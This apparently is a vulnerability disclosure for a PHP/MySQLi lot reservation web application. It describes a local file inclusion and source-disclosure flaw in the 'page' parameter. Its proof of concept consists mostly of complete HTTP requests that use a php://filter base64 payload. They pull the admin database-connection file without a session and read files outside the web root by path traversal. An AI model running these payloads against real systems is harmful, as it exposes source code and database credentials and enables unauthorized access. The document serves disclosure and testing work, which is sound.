About

The Lot Reservation Management System is a simple PHP/MySQLi project that will help a certain subdivision, condo, or any business that selling a land property or house and lot. The system will help the said industry or company to provide their possible client information about the property they are selling and at the same time, possible clients can reserve their desired property. The lot reservation system website for the clients has user-friendly functions and the contents that are displayed can be managed dynamically by the management. This system allows management to upload the area map, and by this feature, the system admin or staff will populate the list of lots, house models, or the property that they are selling to allow the possible client to choose the area they want. The map will be divided into each division of the property of building like Phase 1-5 of a certain Subdivision, each of these phases will be encoded individually in the system along with the map image showing the division of each property or lots.

Vulnerability:-

The application is vulnerable to PHP source code disclosure vulnerability. This can be abused by an attacker to disclose sensitive PHP files within the application and also outside the server root. PHP conversion to base64 filter will be used in this scenario.

Proof of Concept:-

(HTTP POST Request)

GET /lot/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
Host: 192.168.150.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.150.228/lot/
Cookie: PHPSESSID=o59sqrufi4171o8bkbmf1aq9sn
Upgrade-Insecure-Requests: 1

The same can be achieved by removing the PHPSESSID cookie as below:-

GET /lot/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect HTTP/1.1
Host: 192.168.150.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.150.228/lot/
Upgrade-Insecure-Requests: 1

The file requested will be returned in base64 format in returned HTTP response.

The attack can also be used to traverse directories to return files outside the web root.

GET /lot/index.php?page=php://filter/convert.base64-encode/resource=D:\test HTTP/1.1
Host: 192.168.150.228
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.150.228/lot/
Upgrade-Insecure-Requests: 1

This will return test.php file in the D:\ directory.
